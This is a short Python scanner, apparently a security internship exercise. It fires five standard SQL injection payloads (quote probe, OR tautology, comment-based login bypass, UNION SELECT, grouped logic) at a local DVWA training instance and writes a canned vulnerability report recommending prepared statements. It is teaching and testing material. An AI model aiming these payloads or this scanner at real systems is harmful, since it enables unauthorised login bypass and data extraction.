
import requests
import time

# --- CONFIGURATION ---
# Ensure this PHPSESSID is active in your browser
PHPSESSID = "i7714o9katvjma5asta1p84gh8"
TARGET_URL = "http://localhost/dvwa/vulnerabilities/sqli/"
headers = {"Cookie": f"PHPSESSID={PHPSESSID}; security=low"}

# Professional Payload Dictionary (Remains the same for the report)
payload_data = {
    "'": "Standard Single Quote Probe - Tests for basic escaping vulnerabilities.",
    "1' OR '1'='1": "Tautology-based Injection - Tests for Authentication Bypass and Data Leakage.",
    "admin' --": "Comment-based Injection - Tests if attacker can bypass login by commenting out the password check.",
    "1' UNION SELECT 1,2--": "UNION-based Injection - Tests if data from other tables can be extracted.",
    "') OR ('1'='1": "Grouped-logic Injection - Tests for vulnerabilities within nested SQL queries."
}

def generate_long_report(findings):
    report_name = "SQL_Injection_Scanner_Report.txt"
    with open(report_name, "w") as f:
        f.write("============================================================\n")
        f.write("      VULNERABILITY REPORT: SQL INJECTION\n")
        f.write("============================================================\n")
        f.write(f"DATE: {time.ctime()}\n")
        f.write(f"TARGET: {TARGET_URL}\n")
        f.write("ASSESSOR: Cyber Security Intern\n")
        f.write("STATUS: CRITICAL VULNERABILITIES IDENTIFIED\n\n")

        f.write("1. EXECUTIVE SUMMARY\n")
        f.write("--------------------\n")
        f.write("During the security assessment, the automated scanner identified multiple\n")
        f.write("critical entry points susceptible to SQL Injection (SQLi).\n\n")

        f.write("2. TECHNICAL FINDINGS\n")
        f.write("---------------------\n")
        for p, result in findings.items():
            f.write(f"[+] PAYLOAD: {p}\n")
            f.write(f"    RESULT: {result['status']}\n")
            f.write(f"    SEVERITY: {result['severity']}\n")
            f.write(f"    INDICATOR: {result['indicator']}\n\n")

        f.write("3. RISK IMPACT\n")
        f.write("--------------\n")
        f.write("* DATA EXFILTRATION: Attackers can dump user tables.\n")
        f.write("* AUTHENTICATION BYPASS: Bypassing login forms.\n\n")

        f.write("4. REMEDIATION STRATEGIES\n")
        f.write("-------------------------\n")
        f.write("[HIGH] Use Prepared Statements (Parameterized Queries).\n")
        f.write("============================================================\n")
    
    return report_name

def run_scanner():
    # UPDATED: Matches your requested PowerShell output format
    print("🚀 Running Final Internship Probe...")
    scan_results = {}

    for payload in payload_data.keys():
        test_url = f"{TARGET_URL}?id={payload}&Submit=Submit#"
        response = requests.get(test_url, headers=headers)

        if "SQL syntax" in response.text:
            # UPDATED: Success message
            print(f"[!] VULNERABILITY DETECTED: Payload [{payload}]")
            scan_results[payload] = {
                "status": "VULNERABLE",
                "severity": "CRITICAL",
                "indicator": "MySQL/MariaDB Syntax Error Leakage"
            }
        else:
            # UPDATED: Blocked/Safe message
            print(f"[-] Payload [{payload}] was blocked. Is Security set to LOW in DVWA?")
            scan_results[payload] = {
                "status": "SECURE",
                "severity": "N/A",
                "indicator": "No Database Error detected"
            }
        time.sleep(0.5)

    report_file = generate_long_report(scan_results)
    print(f"\n✅ Professional Report Generated: {report_file}")

if __name__ == "__main__":
    run_scanner()